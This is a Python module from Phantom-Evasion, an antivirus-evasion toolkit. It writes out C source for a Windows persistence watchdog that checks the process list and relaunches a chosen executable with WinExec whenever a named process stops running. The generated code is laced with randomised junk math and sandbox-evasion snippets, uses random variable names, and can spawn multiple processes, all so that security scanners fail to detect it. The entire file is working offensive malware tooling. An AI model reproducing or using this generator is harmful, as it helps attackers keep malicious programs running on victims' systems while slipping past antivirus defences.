
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc
from usefull import CheckForBackslash

PathOrFilename = CheckForBackslash(sys.argv[1])

Procname = sys.argv[2]

WaitBeforeCheck = sys.argv[3]

Evasion_Junkcode = sys.argv[4]

SpawnMultiProc = int(sys.argv[5])

RandBool= varname_creator()

RandEntry = varname_creator()

RandHandle = varname_creator()


Junkcode_01 = Junkmathinject()	        # Junkcode
Junkcode_02 = Junkmathinject()		# Junkcode
Junkcode_03 = Junkmathinject()		# Junkcode
Junkcode_04 = Junkmathinject()		# Junkcode
Junkcode_05 = Junkmathinject()		# Junkcode
Junkcode_06 = Junkmathinject()		# Junkcode
Junkcode_07 = Junkmathinject()		# Junkcode

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()

 

Hollow_code = ""

Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "#include <tlhelp32.h>\n"

Hollow_code += "int main(int argc, char * argv[]){\n"

if Evasion_Junkcode == "True":
    Hollow_code += Junkcode_01
    Hollow_code += WinEvasion_01
    Hollow_code += Junkcode_02
    Hollow_code += WinEvasion_02
    Hollow_code += Junkcode_03
    Hollow_code += WinEvasion_03
    Hollow_code += Junkcode_04
    Hollow_code += WinEvasion_04
    Hollow_code += Junkcode_05
    Hollow_code += WinEvasion_05

Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += "while (TRUE){\n"
Hollow_code += "BOOL " + RandBool + " = FALSE;\n"
Hollow_code += "PROCESSENTRY32 " + RandEntry + ";\n"
Hollow_code += "" + RandEntry + ".dwSize = sizeof(PROCESSENTRY32);\n"
Hollow_code += "HANDLE " + RandHandle + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);\n"
Hollow_code += "if (Process32First(" + RandHandle + ", &" + RandEntry + ")){\n"
Hollow_code += "if (strcmp(" + RandEntry + ".szExeFile, \"" + Procname + "\") == 0){" + RandBool + " = TRUE;}\n"
Hollow_code += "while (Process32Next(" + RandHandle + ", &" + RandEntry + ")){\n"
Hollow_code += "if (strcmp(" + RandEntry + ".szExeFile, \"" + Procname + "\") == 0){" + RandBool + " = TRUE;}}\n"
Hollow_code += "CloseHandle(" + RandHandle + ");\n"
Hollow_code += "if (" + RandBool + " == FALSE ){WinExec(\"" + PathOrFilename + "\",0);}}\n"
Hollow_code += "Sleep(" + WaitBeforeCheck + ");}\n"
Hollow_code += close_brackets_multiproc(SpawnMultiProc)

if Evasion_Junkcode == "True":
    Hollow_code+= "}}" + Junkcode_06 + "}}" + Junkcode_07 + "}\n"

Hollow_code += "return(0);}\n"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)



